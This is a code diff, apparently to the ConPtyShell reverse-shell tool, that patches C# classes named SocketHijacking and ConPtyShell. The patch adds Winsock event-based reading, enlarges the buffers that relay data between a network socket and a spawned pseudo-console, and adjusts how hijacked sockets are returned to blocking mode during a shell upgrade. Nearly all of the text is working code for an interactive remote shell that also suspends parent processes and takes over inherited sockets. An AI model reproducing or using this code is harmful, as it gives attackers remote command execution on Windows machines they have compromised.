@@ -391,8 +391,7 @@ public static class SocketHijacking
 
     [DllImport("Ws2_32.dll")]
     public static extern int ioctlsocket(IntPtr s, int cmd, ref int argp);
-
-
+    
     //helper method with "dynamic" buffer allocation
     private static IntPtr NtQuerySystemInformationDynamic(int infoClass, int infoLength)
     {
@@ -832,6 +831,8 @@ public static class ConPtyShell
     private const int STD_OUTPUT_HANDLE = -11;
     private const int STD_ERROR_HANDLE = -12;
     private const int WSAEWOULDBLOCK = 10035;
+    private const int FD_READ = (1 << 0);
+
 
 
 
@@ -1012,6 +1013,22 @@ public static class ConPtyShell
 
     [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern int send(IntPtr Socket, byte[] buf, int len, uint flags);
+
+    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr WSACreateEvent();
+
+    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern int WSAEventSelect(IntPtr s, IntPtr hEventObject, int lNetworkEvents);
+
+    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern int WSAWaitForMultipleEvents(int cEvents, IntPtr[] lphEvents, bool fWaitAll, int dwTimeout, bool fAlertable);
+
+    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern bool WSAResetEvent(IntPtr hEvent);
+
+    [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern bool WSACloseEvent(IntPtr hEvent);
+
 
     [DllImport("ntdll.dll")]
     private static extern uint NtSuspendProcess(IntPtr processHandle);
@@ -1207,7 +1224,7 @@ public static class ConPtyShell
         object[] threadParameters = (object[])threadParams;
         IntPtr OutputPipeRead = (IntPtr)threadParameters[0];
         IntPtr shellSocket = (IntPtr)threadParameters[1];
-        int bufferSize = 256;
+        int bufferSize = 8192;
         bool readSuccess = false;
         Int32 bytesSent = 0;
         uint dwBytesRead = 0;
@@ -1264,25 +1281,33 @@ public static class ConPtyShell
         IntPtr InputPipeWrite = (IntPtr)threadParameters[0];
         IntPtr shellSocket = (IntPtr)threadParameters[1];
         IntPtr hChildProcess = (IntPtr)threadParameters[2];
-        int bufferSize = 256;
+        int bufferSize = 8192;
         bool writeSuccess = false;
         Int32 nBytesReceived = 0;
         uint bytesWritten = 0;
         bool socketBlockingOperation = false;
+        IntPtr wsaReadEvent = WSACreateEvent();
+        // we expect the socket to be non-blocking at this point. we create an asynch event to be signaled when the recv operation is ready to get some data
+        WSAEventSelect(shellSocket, wsaReadEvent, FD_READ);
+        IntPtr[] wsaEventsArray = new IntPtr[] { wsaReadEvent };
         do
         {
             byte[] bytesReceived = new byte[bufferSize];
+            WSAWaitForMultipleEvents(wsaEventsArray.Length, wsaEventsArray, true, 500, false);
             nBytesReceived = recv(shellSocket, bytesReceived, bufferSize, 0);
+            // we still check WSAEWOULDBLOCK for a more robust implementation
             if (WSAGetLastError() == WSAEWOULDBLOCK)
             {
                 socketBlockingOperation = true;
                 continue;
             }
+            WSAResetEvent(wsaReadEvent);
             socketBlockingOperation = false;
             // Console.WriteLine("debug: ThreadReadSocketWritePipe recv: nBytesReceived = " + nBytesReceived + " WSAGetLastError() = " + WSAGetLastError().ToString());
             writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);
             // Console.WriteLine("debug ThreadReadSocketWritePipe WriteFile: bytesWritten = " + bytesWritten + " Marshal.GetLastWin32Error() = " + Marshal.GetLastWin32Error());
         } while (socketBlockingOperation || (nBytesReceived > 0 && writeSuccess));
+        WSACloseEvent(wsaReadEvent);
         TerminateProcess(hChildProcess, 0);
     }
 
@@ -1442,7 +1467,12 @@ public static class ConPtyShell
         thReadSocketWritePipe.Abort();
         if (upgradeShell)
         {
-            if (!IsSocketOverlapped) SocketHijacking.SetSocketBlockingMode(shellSocket, 0);
+            if (!IsSocketOverlapped)
+            {
+                // cancelling the event selection for the socket
+                WSAEventSelect(shellSocket, IntPtr.Zero, 0);
+                SocketHijacking.SetSocketBlockingMode(shellSocket, 0);
+            }
             if (parentSocketInherited) NtResumeProcess(parentProcess.Handle);
             if (grandParentSocketInherited) NtResumeProcess(grandParentProcess.Handle);
         }
